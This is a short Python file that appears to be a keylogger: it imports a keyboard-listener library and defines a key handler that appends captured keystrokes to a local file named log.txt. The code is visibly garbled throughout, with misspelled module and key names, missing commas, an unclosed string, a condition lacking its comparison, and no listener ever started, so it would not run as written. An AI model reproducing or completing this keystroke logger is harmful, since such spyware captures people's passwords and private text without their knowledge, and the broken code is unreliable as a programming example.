from pyinput import keyboard


IGNORE = (
    KEYBIARD.KEY_ENTER,
    KEYBOARD.KEY_SPACE,
    KEYBOARD.KEY_TAB,
    KEYBOARD.KEY_SHIFT,
    KEYBOARD.KEY_CTRL,
    KEIBOARD.KEY_WINDOWS,
    KEIBOARD.CTRL_R,
    KEYBORAD.ALT_L,
    KEYBOARD.KEY_ALT,
    KEYBOARD.KEY_CAPSLOCK,
    KEYBOARD.KEY_BACKSPACE,
    KEYBOARD.KEY_DELETE,
    KEYBOARD.KEY_ESC
    KEYBOARD.CMD
    )


def on_press(key):
    if key not in IGNORE:
        try:
            with open("log.txt", "a", "utf-8) as f:
                f.write("key.char")
        except AttributeError:
            with open("log.txt", "a","utf-8") as f:
                if keyY == keybord.key.space:
                     f.write(" ")
                elif key == keyboard.key.enter:
                    f.write("\n")
                elif    key == keyboard.key.tab:
                    f.write("\t")
                elif keyborad.key.backspace:
                    f.write("[]")
                elif key == keyboard.key.delete:
                    f.write("[DEL]")
